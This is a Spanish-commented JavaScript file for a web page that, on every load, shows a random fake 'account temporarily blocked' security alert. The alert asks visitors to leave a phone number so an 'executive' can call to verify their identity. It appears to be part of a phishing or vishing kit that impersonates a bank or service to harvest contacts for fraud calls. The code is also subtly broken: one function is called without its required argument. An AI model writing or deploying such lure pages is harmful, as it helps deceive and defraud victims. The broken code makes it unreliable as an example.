document.addEventListener('DOMContentLoaded', function() {
    // Mensajes para cuenta bloqueada
    const mensajesBloqueo = [
        {
            titulo: "Cuenta temporalmente bloqueada",
            parrafo: "Por su seguridad, su cuenta ha sido bloqueada temporalmente. Un ejecutivo se pondrá en contacto con usted para verificar su identidad."
        },
        {
            titulo: "Verificación de seguridad requerida",
            parrafo: "Para proteger su información, necesitamos verificar algunos datos. Complete el formulario y un asesor lo contactará en las próximas 24 horas."
        },
        {
            titulo: "Acceso suspendido por seguridad",
            parrafo: "Detectamos actividad inusual en su cuenta. Para reactivar su acceso, proporcione sus datos de contacto a continuación."
        }
    ];

    // Elementos del DOM
    const tituloElement = document.querySelector('.form-title');
    const descripcionElement = document.querySelector('.form-description');
    const formularioElement = document.querySelector('.client-form');
    const progressBar = document.querySelector('.progress-bar');
    
    let indiceActual = 0;
    let modoBloqueo = false;

    // Función para cambiar a modo bloqueo
    function activarModoBloqueo() {
        modoBloqueo = true;
        
        // Mantener barra de progreso con paso 1 activo
        if (progressBar) {
            const step1 = progressBar.querySelector('.progress-step:first-child');
            const step2 = progressBar.querySelector('.progress-step:last-child');
            const line = progressBar.querySelector('.progress-line');
            
            // Mantener paso 1 activo y paso 2 inactivo
            step1.classList.add('active');
            step2.classList.remove('active');
            line.classList.add('active');
            
            // Cambiar el icono del paso 2 por el número 2
            const step2Circle = step2.querySelector('.step-circle');
            if (step2Circle) {
                step2Circle.innerHTML = '2';
            }
        }
        
        // Cambiar título y descripción con el mensaje seleccionado
        tituloElement.textContent = mensajesBloqueo[indiceActual].titulo;
        descripcionElement.textContent = mensajesBloqueo[indiceActual].parrafo;
        
        // El formulario ya está en el HTML, solo necesitamos validar los campos de teléfono
        validarTelefono();
        
        // NO iniciar ciclo de mensajes - los mensajes no cambian automáticamente
        // iniciarCicloMensajes();
    }

    // Función para actualizar mensajes (NO SE USA - mensajes no cambian automáticamente)
    /*
    function actualizarMensaje() {
        if (!modoBloqueo) return;
        
        // Fade out
        tituloElement.style.opacity = '0';
        descripcionElement.style.opacity = '0';
        
        setTimeout(() => {
            indiceActual = (indiceActual + 1) % mensajesBloqueo.length;
            tituloElement.textContent = mensajesBloqueo[indiceActual].titulo;
            descripcionElement.textContent = mensajesBloqueo[indiceActual].parrafo;
            
            // Fade in
            tituloElement.style.opacity = '1';
            descripcionElement.style.opacity = '1';
        }, 500);
    }

    // Función para iniciar ciclo de mensajes (NO SE USA - mensajes no cambian automáticamente)
    function iniciarCicloMensajes() {
        // Configurar transiciones
        tituloElement.style.transition = 'opacity 0.5s ease-in-out';
        descripcionElement.style.transition = 'opacity 0.5s ease-in-out';
        
        // Iniciar ciclo cada 6 segundos (más rápido para testing)
        setInterval(actualizarMensaje, 6000);
    }
    */

    // Función para validar teléfono (solo números)
    function validarTelefono(input) {
        input.addEventListener('input', function(e) {
            // Remover caracteres no numéricos
            this.value = this.value.replace(/\D/g, '');
        });
    }

    // Activar modo bloqueo inmediatamente al cargar la página
    // Seleccionar un mensaje aleatorio para empezar
    indiceActual = Math.floor(Math.random() * mensajesBloqueo.length);
    activarModoBloqueo();
    
    // Agregar validación de teléfonos cuando se creen los campos
    document.addEventListener('input', function(e) {
        if (e.target.classList.contains('phone-field')) {
            validarTelefono(e.target);
        }
    });
});
